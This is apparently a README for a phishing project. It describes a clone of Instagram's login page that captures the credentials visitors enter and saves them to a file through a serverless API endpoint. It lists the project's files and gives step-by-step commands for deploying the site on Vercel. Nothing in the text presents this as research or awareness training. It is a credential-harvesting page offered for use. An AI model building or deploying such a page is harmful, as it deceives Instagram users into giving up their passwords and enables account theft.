# Instagram Login Page

A clone of Instagram's login page that saves user credentials.

## Features
- Instagram-style login interface
- Responsive design
- Saves login data to a file via API
- Ready for Vercel deployment

## Local Development
1. Install Vercel CLI: `npm i -g vercel`
2. Run: `vercel dev`
3. Open: `http://localhost:3000`

## Deploy to Vercel
1. Push code to GitHub
2. Import repository in Vercel dashboard
3. Deploy automatically

## File Structure
- `index.html` - Main login page
- `style.css` - Styling
- `script.js` - Form handling
- `api/save-login.js` - Serverless function to save credentials
- `vercel.json` - Vercel configuration

## Note
Login data is saved to `/tmp/login-data.txt` on Vercel (temporary storage).
